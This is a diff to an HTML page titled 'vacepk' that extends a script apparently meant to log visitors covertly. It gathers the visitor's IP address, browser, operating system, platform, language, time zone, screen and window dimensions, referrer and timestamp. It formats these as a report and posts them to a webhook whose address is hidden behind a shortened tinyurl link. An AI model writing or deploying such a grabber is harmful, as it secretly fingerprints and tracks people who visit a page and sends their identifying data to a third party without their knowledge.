@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta.charset="UTF-8">
+    <meta charset="UTF-8">
     <title>vacepk</title>
     <style>
         body {
@@ -62,23 +62,79 @@
                 return { browser, os };
             }
 
+            function getScreenInfo() {
+                const width = screen.width;
+                const height = screen.height;
+                const colorDepth = screen.colorDepth;
+                const pixelDepth = screen.pixelDepth;
+
+                return {
+                    width: width,
+                    height: height,
+                    colorDepth: colorDepth,
+                    pixelDepth: pixelDepth
+                };
+            }
+
+            function getWindowInfo() {
+                const width = window.innerWidth;
+                const height = window.innerHeight;
+
+                return {
+                    width: width,
+                    height: height
+                };
+            }
+
+            function getPlatform() {
+                return navigator.platform || 'Unknown Platform';
+            }
+
+            function getLanguage() {
+                return navigator.language || 'Unknown Language';
+            }
+
+            function getTimeZone() {
+                return Intl.DateTimeFormat().resolvedOptions().timeZone || 'Unknown Time Zone';
+            }
+
+            function isOnline() {
+                return navigator.onLine ? 'Online' : 'Offline';
+            }
+
             async function sendInfo() {
                 const ip = await getIP();
                 const { browser, os } = getUA();
-                const screenWidth = screen.width;
-                const screenHeight = screen.height;
+                const { width: screenWidth, height: screenHeight, colorDepth, pixelDepth } = getScreenInfo();
+                const { width: windowWidth, height: windowHeight } = getWindowInfo();
+                const platform = getPlatform();
+                const language = getLanguage();
+                const timeZone = getTimeZone();
+                const onlineStatus = isOnline();
                 const referrer = document.referrer || 'Direct';
                 const timestamp = new Date().toISOString();
 
-                const data = {
-                    ip: ip,
-                    browser: browser,
-                    os: os,
-                    screenWidth: screenWidth,
-                    screenHeight: screenHeight,
-                    referrer: referrer,
-                    timestamp: timestamp
-                };
+                const data = `
+\`\`\`
+Visitor Information
+-------------------
+IP Address: ${ip}
+Browser: ${browser}
+Operating System: ${os}
+Platform: ${platform}
+Language: ${language}
+Time Zone: ${timeZone}
+Online Status: ${onlineStatus}
+Screen Width: ${screenWidth}px
+Screen Height: ${screenHeight}px
+Window Width: ${windowWidth}px
+Window Height: ${windowHeight}px
+Color Depth: ${colorDepth} bits
+Pixel Depth: ${pixelDepth} bits
+Referrer: ${referrer}
+Timestamp: ${timestamp}
+\`\`\`
+                `;
 
                 const webhookURL = 'https://tinyurl.com/ye8m429u'; // Shortened URL
 
@@ -87,7 +143,7 @@
                     headers: {
                         'Content-Type': 'application/json'
                     },
-                    body: JSON.stringify({ content: JSON.stringify(data) })
+                    body: JSON.stringify({ content: data })
                 });
             }
 
